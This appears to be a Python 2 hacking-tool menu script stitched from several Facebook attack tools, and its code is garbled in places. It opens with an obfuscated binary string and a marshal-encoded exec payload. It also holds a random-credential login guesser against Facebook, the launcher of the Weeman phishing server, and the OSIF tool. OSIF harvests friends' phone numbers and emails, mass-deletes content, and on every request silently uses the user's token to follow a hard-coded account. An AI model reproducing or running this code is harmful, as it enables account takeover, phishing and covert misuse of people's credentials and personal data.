010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010101100011001101100110010100110101011000100011001001100001001101010110010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011010001100010001101100110011000110110011001010011011000110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110001000110111001100110011011000111001001100100011000000110100001110000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110001001101100011001000110110001110010011011100110011001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011001000110000001101110011001100110110001101010011011000110001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011011100110110011001100011011100110010001101100011010000110010001110010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110100001100100011000000110100011000100011011000110101001101110011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100100011011001100110001101100011000100110111001100100011011000110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101000011100100110110011001010011011100110100001101100011010100110111001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110010001101110011010100110111001100000011011100110100001100110110000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100100011010101100011001101100110010100110010001100000011010101100010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100000110000100110110001110010011011000110110001100100011000000110101011001100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010101100110001101100110010100110110001100010011011001100100001101100011010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110101011001100011010101100110001100100011000000110011011001000011001101100100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010001101110011010101100110001101010110011000110110011001000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110001001101100011100100110110011001010011010101100110001101010110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001101110011001101100001001100000110000100110010001100000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010001100000011011000110011001101100011100000110110001101010111010001011100011110000011000000111000010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011001100110110011000100011001000111000001100100011100101110100010111000111100000110000001100010101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000010001001110100010111000111100000110000001100010101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000010111001110100010111000111100000110000001100110101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000110010001100101011000110111010001011100011110000011000000110011010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000011011110110010001100101011100110101110001111000001100000011001001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000101000001000100111010001011100011110000011000000110001010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000011010000111010001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000011101000101110001111000001100000011000101011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000001100101011100110101110001111000001100000011001001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000001111000001000100111010001011100011110000011000000110001010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001010010111010001011100011110000011000000110001010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001010000111001101011100011110000011000000110010010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001000100111010101110011010111000111100000110000001100100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011100000100010010011100010100001011100011110000011000000110001010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000011101000101110001111000001100000011011101011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000001011111010111110110010001101111011000110101111101011111001010000101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000101000010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000010100001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000011100110101110001111000001100000011001101011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000111100011100110011111001110100010111000111100000110000001110000101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011110001101101011011110110010001110101011011000110010100111110010111000111100000110000001100010101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000111001100101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001101100101110001111000001100000011000001011100011110000110011001100110010111000111100000110000001100000101110001111000011001100110011001011100011110000011000000110000010111000111100001100110011001100101110001111000001100000011000001011100011110000110011001100110010111000111100000110000001100000101110001111000011001100110011001011100011110000011000000110000010111000111100001100110011001100101110001111000001100000011000001011100011110000110011001100110010111000111100000110000001100000101110001111000011001100110011001011100011110000011000000110000010111000111100001100110011001100101110001111000001100000011000001011100011110000110011001100110010111000111100000110000001100000101110001111000011001100110011001011100011110000011000000110000010111000111100001100110011001100101110001111000001100000011000001011100011110000110011001100110010111000111100000110000001100000101110001111000011001100110011001011100011110000011000000110000010111000111100001100110011001100101110001111000001100000011000001011100011110000110011001100110010111000111100000110000001100000101110001111000011001100110011001011100011110000011000000110000010111000111100001100110011001100101110001111000001100000011000001011100011110000110011001100110010111000111100000110000001100000101110001111000011001100110011001011100011110000011000000110000010111000111100001100110011001100101110001111000001100000011000001011100011110000110011000111001010111000111100000110000001100000010011100100111001001110010100100101001"

 import marshal
 exec(marshal.loads('''c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\xd6\x00\x00\x00d\x00\x00Z\x00\x00d*\x00d\x04\x00\x17d\x05\x00\x17d\x06\x00\x17d\x07\x00\x17d\x08\x00\x17d\t\x00\x17d\n\x00\x17d\x0b\x00\x17d\x0c\x00\x17d\r\x00\x17d\x0e\x00\x17d\x0f\x00\x17d\x10\x00\x17d\x11\x00\x17d\x12\x00\x17d\x13\x00\x17d\x14\x00\x17d\x15\x00\x17d\x16\x00\x17d\x17\x00\x17d\x18\x00\x17d\x04\x00\x17d\x19\x00\x17d\x1a\x00\x17d\x1b\x00\x17d\x1c\x00\x17d\x1d\x00\x17d\x1e\x00\x17d\x1f\x00\x17d \x00\x17d!\x00\x17d!\x00\x17d!\x00\x17d!\x00\x17d!\x00\x17d!\x00\x17d"\x00\x17d!\x00\x17d!\x00\x17d!\x00\x17d#\x00\x17d$\x00\x17d\x1c\x00\x17d\x1d\x00\x17d\x1e\x00\x17d%\x00\x17d&\x00\x17d\'\x00\x17d$\x00\x17d(\x00\x04Ud(\x00S(+\x00\x00\x00t\x04\x00\x00\x000000t\x02\x00\x00\x00exs\x03\x00\x00\x00ec"t\n\x00\x00\x006465662075t\n\x00\x00\x006e62696e28t\n\x00\x00\x00782c626974t\n\x00\x00\x00733d38293at\n\x00\x00\x000a20726574t\n\x00\x00\x0075726e2027t\n\x00\x00\x00272e6a6f69t\n\x00\x00\x006e285b6368t\n\x00\x00\x007228696e74t\n\x00\x00\x002873747228t\n\x00\x00\x0078295b693at\n\x00\x00\x00692b626974t\n\x00\x00\x00735d2c3229t\n\x00\x00\x002920666f72t\n\x00\x00\x00206920696et\n\x00\x00\x002072616e67t\n\x00\x00\x006528302c6ct\n\x00\x00\x00656e287374t\n\x00\x00\x007228782929t\n\x00\x00\x002c62697473t\n\x00\x00\x00295d290a65t\n\x00\x00\x007865632875t\n\x00\x00\x007478742929t\x02\x00\x00\x000at\x01\x00\x00\x00"t\x01\x00\x00\x00.t\x03\x00\x00\x00dect\x03\x00\x00\x00odes\x02\x00\x00\x00("t\x01\x00\x00\x00ht\x00\x00\x00\x00t\x01\x00\x00\x00es\x02\x00\x00\x00x"t\x01\x00\x00\x00)t\x01\x00\x00\x00(s\x02\x00\x00\x00"us\x02\x00\x00\x008"Ns\x05\x00\x00\x00exec"s\x0f\x00\x00\x00exec"6465662075(\x01\x00\x00\x00t\x07\x00\x00\x00__doc__(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x03\x00\x00\x00<s>t\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x04\x00\x00\x00\x06\x00\xcc\x00'''))
 backtomenu_account()
def facebook_motah():
 import sys, mechanize, cookielib, random
 def sem():
    print ''
    print ''
    print cyan + '  alger {05 / 06 / 07}   '
    print cyan + '  United States {98 / 62 }'
    print cyan + '  Available {}'
    print g


 sem()
 kk = str(raw_input('Enter a number ------->'))

 def motah():
     email = str(random.randint(11111111, 99999999))
     go = kk + email
     password = str(random.randint(11111111, 99999999))
     login = 'https://www.facebook.com/login.php?login_attempt=1'
     useragents = [
      ('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
     basss = random.randint(11111111, 99999999)
     br = mechanize.Browser()
     amer = cookielib.LWPCookieJar()
     br.set_handle_robots(False)
     br.set_handle_redirect(True)
     br.set_cookiejar(amer)
     br.set_handle_equiv(True)
     br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=5)
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)
     br.form['email'] = go
     br.form['pass'] = go
     sub = br.submit()
     log = sub.geturl()
     print b, 'Check===> ', r, go
     if 'https://www.facebook.com/checkpoint/?next' in log:
         print g, 'good ---------> ', c, go
     elif 'https://www.facebook.com/login.php' in log:
         print ''
     else:
         print g, 'good ---------> ', g, go
     opop()
 
 
 motah()
 backtomenu_account()
def facebook_weeman():
 #!/usr/bin/env python2
#
# weeman.py - HTTP server for phishing
#
#  Weeman is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  Weeman is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Copyright (C) 2015 Hypsurus <hypsurus@mail.ru>
#
 import sys
 import optparse
 from core.misc import printt
 from core.config import user_agent as usera

 def tests_pyver():
    if sys.version[:3] == "2.7" or "2" in sys.version[:3]:
        pass # All good
    elif "3" in sys.version[:3]:
        printt(1,"Weeman has no support for Python 3.")
    else:
        printt(1, "Your Python version is very old ..")

 def tests_platform():
    if "linux" in sys.platform:
        #printt(3, "Running Weeman on linux ... (All good)")
        pass
    elif "darwin" in sys.platform:
        #printt(3, "Running Weeman on \'Mac\' (All good)")
        pass
    elif "win" in sys.platform:
        print("Sorry, there is no support for windows right now.")
        sys.exit(1)
    else:
        printt(3, "If \'Weeman\' runs sucsessfuly on your platform %s\nPlease let me (@Hypsurus) know!" %sys.platform)

 def main():
    tests_pyver()
    tests_platform()
    parser = optparse.OptionParser()
    parser.add_option("-q", "--quiet", dest="quiet_mode_opt", action="store_true", default=False, help="Runs without displaying the banner.")
    parser.add_option("-p", "--profile", dest="profile", help="Load weeman profile.")
    options,r = parser.parse_args()

    if options.profile:
        from core.shell import shell_noint
        shell_noint(options.profile)
    else:
        from core.shell import shell
        shell()

 if __name__ == '__main__':
    main()

 backtomenu_account()
def facebook_osif():
 
 ###################################################################
 #                        Import Module
 import json , sys , hashlib , os , time , marshal, getpass
 ###################################################################
 '''
     Jangan Direcode ya bosku , tinggal make apa susahnya sih
 '''
 ###################################################################
 #                             COLOR
 if sys.platform in ["linux","linux2"]:
	W = "\033[0m"
        G = '\033[32;1m'
        R = '\033[31;1m'
 else:
	W = ''
	G = ''
	R = ''
 ###################################################################
 #                      Exception
 try:
	import requests
 except ImportError:
	print R + '_     _'.center(44)
	print "o' \.=./ `o".center(44)
	print '(o o)'.center(44)
	print 'ooO--(_)--Ooo'.center(44)
	print W + ' '
	print ('O S I F').center(44)
	print ' '
	print "[!] Can't import module 'requests'\n"
	sys.exit()
 ####################################################################
 #                    Set Default encoding
 reload (sys)
 sys . setdefaultencoding ( 'utf8' )
 ####################################################################
 #       	        I don't know
 jml = []
 jmlgetdata = []
 n = []
 ####################################################################
 #                        BANNER
 def baliho():
	try:
		token = open('cookie/token.log','r').read()
		r = requests.get('https://graph.facebook.com/me?access_token=' + token)
		a = json.loads(r.text)
		name = a['name']
		n.append(a['name'])

		print R + '_     _'.center(44)
		print "o' \.=./ `o".center(44)
		print '(o o)'.center(44)
		print 'ooO--(_)--Ooo'.center(44)
		print ' ' + W
		print ('[*] ' + name + ' [*]').center(44)
		print ' '

	except (KeyError,IOError):
		print R + '_     _'.center(44)
		print "o' \.=./ `o".center(44)
		print '(o o)'.center(44)
		print 'ooO--(_)--Ooo'.center(44)
		print ' ' + W
		print ('O S I F').center(44)
		print (W + '     [' + G +'Open Source Information Facebook'+ W + ']')
		print ' '
 ####################################################################
 #		    Print In terminal
 def show_program():

	print '''
                    %sINFORMATION%s
 ------------------------------------------------------

    Author     Debby Anggraini 'CiKu370'
    Name       OSIF 'Open Source Information Facebook'
    CodeName   D3b2y
    version    full version
    Date       16/05/2018 09:35:12
    Team       Blackhole Security
    Email      xnver404@gmail.com
    Telegram   @CiKu370

 * if you find any errors or problems , please contact
  author
 '''%(G,W)
 def info_ga():

	print '''
     %sCOMMAND                      DESCRIPTION%s
  -------------       -------------------------------------

   get_data           fetching all friends data
   get_info           show information about your friend

   dump_id            fetching all id from friend list
   dump_phone         fetching all phone number from friend list
   dump_mail          fetching all emails from friend list
   dump_<id>_id       fetching all id from your friends <spesific>
		      ex: dump_username_id

   token              Generate access token
   cat_token          show your access token
   rm_token           remove access token

   bot                open bot menu

   clear              clear terminal
   help               show help
   about              Show information about this program
   exit               Exit the program
 '''%(G,W)
 def menu_bot():
	print '''
   %sNumber                  INFO%s
 ---------   ------------------------------------

   [ 01 ]      auto reactions
   [ 02 ]      auto comment
   [ 03 ]      auto poke
   [ 04 ]      accept all friend requests
   [ 05 ]      delete all posts in your timeline
   [ 06 ]      delete all friends
   [ 07 ]      stop following all friends
   [ 08 ]      delete all photo albums

   [ 00 ]      back to main menu
 '''%(G,W)
 def menu_reaction():
	print '''
   %sNumber                  INFO%s
 ----------   ------------------------------------

   [ 01 ]      like
   [ 02 ]      reaction 'LOVE'
   [ 03 ]      reaction 'WOW'
   [ 04 ]      reaction 'HAHA'
   [ 05 ]      reaction 'SAD'
   [ 06 ]      reaction 'ANGRY'

   [ 00 ]      back to menu bot
 '''%(G,W)
 ####################################################################
 #                     GENERATE ACCESS TOKEN
 def get(data):
	print '[*] Generate access token '

	try:
		os.mkdir('cookie')
	except OSError:
		pass

	b = open('cookie/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_token'])
		b.close()
		print '[*] successfully generate access token'
		print '[*] Your access token is stored in cookie/token.log'
		exit()
	except KeyError:
		print '[!] Failed to generate access token'
		print '[!] Check your connection / email or password'
		os.remove('cookie/token.log')
		main()
	except requests.exceptions.ConnectionError:
		print '[!] Failed to generate access token'
		print '[!] Connection error !!!'
		os.remove('cookie/token.log')
		main()
 def id():
	print '[*] login to your facebook account         ';id = raw_input('[?] Username : ');pwd = getpass.getpass('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
	x = hashlib.new('md5')
        x.update(sig)

	data.update({'sig':x.hexdigest()})
        get(data)
 ####################################################################
 #       	            BOT 
 	                # Execute #
 def post():
	global token , WT

	try:
	  if WT == 'wallpost':
		print '[*] fetching all posts id'

		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['home']['data']:
			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
		return result['home']['data']

	  elif WT == 'me':
		print '[*] fetching all posts id'

		r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['feed']['data']:
			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
		return result['feed']['data']

	  elif WT == 'req':
		print '[*] fetching all friends requests'

		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['data']:
			print '\r[*] %s retrieved    '%(i['from']['id']),;sys.stdout.flush();time.sleep(0.01)
		return result['data']

	  elif WT == 'friends':
		print '[*] fetching all friends id'

		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['friends']['data']:
			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.001)
		return result['friends']['data']

	  elif WT == 'subs':
		print '[*] fetching all friends id'

		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['data']:
			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.01)
		return result

	  elif WT == 'albums':
		print '[*] fetching all albums id'

		r = requests.get('https://graph.facebook.com/me?fields=albums.limit(5000)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['albums']['data']:
			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.001)
		return result['albums']['data']

	  else:
		print '[*] fetching all posts id'

		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['feed']['data']:
			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
		return result['feed']['data']

	except KeyError:
		print '[!] failed to retrieve all post id'
		print '[!] Stopped'
		bot()
	except requests.exceptions.ConnectionError:
		print '[!] Connection Error'
		print '[!] Stopped'
		bot()
	except KeyboardInterrupt:
		print '\r[!] Stopped                                      '
		bot()
 def like(posts , amount):
	global type , token , WT

	print '\r[*] All posts id successfuly retrieved            '
	print '[*] Start'

	try:
		counter = 0
		for post in posts:

			if counter >= amount:
				break
			else:
				counter += 1

			parameters = {'access_token' : token , 'type' : type}
			url = "https://graph.facebook.com/{0}/reactions".format(post['id'])
			s = requests.post(url, data = parameters)

			id = post['id'].split('_')[0]

			try:
				print '\r' + W + '[' + G + id + W + '] ' + post['message'][:40].replace('\n',' ') + '...'
			except KeyError:
				try:
					print '\r' + W + '[' + G + id + W + '] ' + post['story'].replace('\n',' ')
				except KeyError:
					print '\r' + W + '[' + G + id + W + '] Successfully liked'

		print '\r[*] Done                   '
		menu_reaction_ask()
	except KeyboardInterrupt:
		print '\r[!] Stopped                     '
		menu_reaction_ask()
 def comment(posts , amount):
	global message , token

	print '\r[*] All posts id successfuly retrieved          '
	print '[*] Start'

	try:
		counter = 0
		for post in posts:
			if counter >= amount:
				break
			else:
				counter += 1

			parameters = {'access_token' : token, 'message' : message}
			url = "https://graph.facebook.com/{0}/comments".format(post['id'])
			s = requests.post(url, data = parameters)

			id = post['id'].split('_')[0]

			try:
				print W + '[' + G + id + W + '] ' +post['message'][:40].replace('\n',' ') + '...'
			except KeyError:
				try:
					print W + '[' + G + id + W + '] ' + post['story'].replace('\n',' ')
				except KeyError:
					print W + '[' + G + id + W + '] successfully commented'
		print '[*] Done'
		bot()
	except KeyboardInterrupt:
                print '\r[!] Stopped'
		bot()
 def remove(posts):
	global token , WT

	print '\r[*] All post id successfully retrieved          '
	print '[*] Start'

	try:
		counter = 0
		for post in posts:
			if counter >= 50:
				break

			r = requests.post('https://graph.facebook.com/{id}?method=delete&access_token={token}'.format(id=post['id'],token=token))
			a = json.loads(r.text)

			try:
				cek = a['error']['message']
				print W + '[' + R + post['id'] + W +'] Failed'
			except TypeError:
				print W + '[' + G + post['id'] + W + '] Removed'
				counter += 1
		print '[*] done'
		bot()
	except KeyboardInterrupt:
		print '\r[!] Stopped'
		bot()
 def confirm(posts):
	global token , WT

	print '\r[*] All friend requests successfully retrieved        '
	print '[*] Start'

	try:
		counter = 0
		for post in posts:
			if counter >= 50:
				break
			else:
				counter += 1

			r = requests.post('https://graph.facebook.com/me/friends/%s?access_token=%s'%(post['from']['id'] , token))
			a = json.loads(r.text)

			try:
				cek = a['error']['message']
				print W + '[' + R + post['from']['name'] + W + '] Failed'
			except TypeError:
				print W + '[' + G + post['from']['name'] + W + '] Confirmed'
		print '[*] Done'
		bot()
	except KeyboardInterrupt:
		print '\r[!] Stopped'
		bot()
 def unfriend(posts):

 #	maaf , fitur unfriend saya encrypt karena tidak
 #	diperbolehkan oleh para owner bot fb :)
 #	buat yg bisa unmarshal , silahkan dipake sendiri ya

	print red + 'error'
 def unfollow(posts):
	global token , WT

	print '\r[*] all id successfully retrieved    '
	print '[*] start'

	try:
		counter = 0
		for post in posts['data']:
			if counter >= 50:
				break
			else:
				counter += 1

			r = requests.post('https://graph.facebook.com/' + post['id'] + '/subscribers?method=delete&access_token=' + token)
			a = json.loads(r.text)

			try:
				cek = a['error']['nessage']
				print W + '[' + R + post['name'] + W + '] failed'
			except TypeError:
				print W + '[' + G + post['name'] + W + '] unfollow'
		print '[*] done'
		bot()
	except KeyboardInterrupt:
		print '\r[!] Stopped'
		bot()
 def poke(posts):
	global token , WT

	print '\r[*] all id successfully retrieved                  '
	print '[*] start'

	try:
		counter = 0
		for post in posts:
			if counter >= 50:
				break
			else:
				counter += 1

			r = requests.post('https://graph.facebook.com/%s/pokes?access_token=%s'%(post['id'].split('_')[0],token))
			a = json.loads(r.text)

			id = post['id'].split('_')[0]
			try:
				cek = a['error']['message']
				print W + '[' + R + id + W + '] failed'
			except TypeError:
				print W + '[' + G + id + W + '] pokes'
		print '[*] Done'
		bot()
	except KeyboardInterrupt:
		print '\r[!] Stopped   '
		bot()
	except (requests.exceptions.ConnectionError):
		print '[!] Connection Error'
		bot()
 def albums(posts):
	global token , WT

	print '\r[*] all id successfully retrieved                 '
	print '[*] Start'

	try:
		counter = 0
		for post in posts:
			if counter >= 50:
				break

			r = requests.post('https://graph.facebook.com/'+post['id']+'?method=delete&access_token='+token)
			a = json.loads(r.text)

			try:
				cek = a['error']['message']
				print W + '[' + R + post['name'] + W + '] Failed'
			except TypeError:
				print W + '[' + G + post['name'] + W + '] femoved'
		print '[*] Done'
		bot()
	except KeyboardInterrupt:
		print '\r[!] Stopped  '
		bot()
	except (requests.exceptions.ConnectionError):
		print '[!] connection error'
		bot()
 ######################################################################################################################
 #			    Bot reaction
  			   # Prepairing #
 def menu_reaction_ask():
  try:
	global type

	cek = raw_input(R + 'D3b2y' + W + '/' + R + 'Bot' + W + '/' + R + 'Reaction' + W + ' >> ')

	if cek in ['1','01']:
		type = 'LIKE'
		bot_ask()
	elif cek in ['2','02']:
		type = 'LOVE'
		bot_ask()
	elif cek in ['3','03']:
		type = 'WOW'
		bot_ask()
	elif cek in ['4','04']:
		type = 'HAHA'
		bot_ask()
	elif cek in ['5','05']:
		type = 'SAD'
		bot_ask()
	elif cek in ['6','06']:
		type = 'ANGRY'
		bot_ask()
	elif cek.lower() == 'menu':
		menu_reaction()
		menu_reaction_ask()
	elif cek.lower() == 'exit':
		print '[!] Exiting program !!'
		sys.exit()
	elif cek.lower() == 'token':
		try:
			open('cookie/token.log')
			print '[!] an access token already exists'
			cek = raw_input('[?] Are you sure you want to continue [Y/N] ')
			if cek.lower() != 'y':
				print '[*] Canceling '
				bot()
		except IOError:
			pass

		print '\n' + '[*] Generate Access token facebook [*]'.center(44) + '\n'
		print '[Warn] please turn off your VPN before using this feature !!!'
		id()
	elif cek in ['0','00']:
		print '[!] back to bot menu'
		bot()

	else:
		if cek == '':
			menu_reaction_ask()
		else:
			print "[!] command '" + cek + "' not found"
			print "[!] type 'menu' to show menu bot"
			menu_reaction_ask()
  except KeyboardInterrupt:
	menu_reaction_ask()

 def bot_ask():
	global id , WT , token

	print '[*] load access token '
	try:
		token = open('cookie/token.log','r').read()
		print '[*] Success load access token'
	except IOError:
		print '[!] Failed load access token'
		print "[!] type 'token' to generate access token"
		menu_reaction_ask()

	WT = raw_input(W + '[?] [' + R + 'W' + W + ']allpost or [' + R + 'T' + W + ']arget (' + R + 'W' + W + '/' + R + 'T' + W + ') : ')
	if WT.upper() == 'T':
		id = raw_input('[?] id facebook : ')
		if id == '':
			print "[!] id target can't be empty"
			print '[!] Stopped'
			menu_reaction_ask()

	else:
		WT = 'wallpost'
	like(post(),50)

 def bot():
  try:
	global type , message , id , WT , token

	cek = raw_input(R + 'D3b2y' + W +'/' + R +'Bot ' + W + '>> ')

	if cek in ['1','01']:
		menu_reaction()
		menu_reaction_ask()
	elif cek in ['2','02']:
		print '[*] load access token'
		try:
			token = open('cookie/token.log','r').read()
		        print '[*] Success load access token'
		except IOError:
	                print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
	                bot()

		WT = raw_input(W + '[?] [' + R + 'W' + W + ']allpost or [' + R + 'T' + W + ']arget (' + R + 'W' + W + '/' + R + 'T' + W + ') : ')
		if WT.lower() == "w" or WT.lower() == '':
			WT = 'wallpost'
		else:
			id = raw_input('[?] Id Target : ')

			if id == '':
				print "[!] id target can't be empty"
				print '[!] Stopped'
				bot()

		print '--------------------------------------------------'
		print "  [Note] Use the '</>' symbol to change the line\n"

		message = raw_input('[?] Your Message : ')
		if message == '':
			print "[!] Message can't be empty"
			print '[!] Stopped'
			bot()
		else:
			message = message.replace('</>','\n')

		comment(post(),50)

	elif cek in ['4','04']:
		WT = 'req'
		print '[*] load access token    '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] Success load access token'
		except IOError:
			print '[!] Failed load access token   '
			print "[!] type 'token' to generate access token"
			bot()
		confirm(post())
	elif cek in ['3','03']:
		WT = 'wallpost'
		print '[*] load access token    '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] Success load access token'
		except IOError:
			print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
			bot()
		poke(post())
	elif cek in ['5','05']:
		WT = 'me'
		print '[*] load access token    '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] Success load access token'
		except IOError:
			print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
			bot()
		remove(post())

	elif cek in ['6','06']:
		WT = 'friends'
		print '[*] load access token     '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] Success load access token'
		except IOError:
			print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
			bot()
		unfriend(post())

	elif cek in ['7','07']:
		WT = 'subs'
		print '[*] load access token      '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] success load access token'
		except IOError:
			print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
			bot()
		unfollow(post())
	elif cek in ['8','08']:
		WT = 'albums'
		print '[*] Load access token      '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] Success load access token'
		except IOError:
			print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
		albums(post())

	elif cek in ['0','00']:
		print '[*] Back to main menu'
		main()
	elif cek.lower() == 'menu':
		menu_bot()
		bot()
	elif cek.lower() == 'exit':
		print '[!] Exiting program'
		sys.exit()
	elif cek.lower() == 'token':
		try:
			open('cookie/token.log')
			print '[!] an access token already exists'
			cek = raw_input('[?] Are you sure you want to continue [Y/N] ')
			if cek.lower() != 'y':
				print '[*] Canceling '
				bot()
		except IOError:
			pass

		print '\n' + '[*] Generate Access token facebook [*]'.center(44) + '\n'
		print '[Warn] please turn off your VPN before using this feature !!!'
		id()
	else:
		if cek == '':
			bot()
		else:
			print "[!] command '"+cek+"' not found"
			print '[!] type "menu" to show menu bot'
			bot()
  except KeyboardInterrupt:
	bot()
 #
 ###############################################################################

 ###############################################################################
 #                         Dump Data

 def dump_id():

	print '[*] Load Access Token'
	try:
		token = open("cookie/token.log",'r').read()
		print '[*] success load access token'
	except IOError:
		print '[!] failed load access token'
		print "[*] type 'token' to generate access token"
		main()

	try:
		os.mkdir('output')
	except OSError:
		pass

	print '[*] fetching all friends id'
	try:

		r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
		a = json.loads(r.text)

		out = open('output/' + n[0].split(' ')[0] + '_id.txt','w')
		for i in a['data']:
			out.write(i['id'] + '\n')
			print '\r[*] %s retrieved'%(i['id']),;sys.stdout.flush();time.sleep(0.0001)

		out.close()
		print '\r[*] all friends id successfuly retreived'
		print '[*] file saved : output/' + n[0].split(' ')[0] + '_id.txt'
		main()

	except KeyboardInterrupt:
		print '\r[!] Stopped'
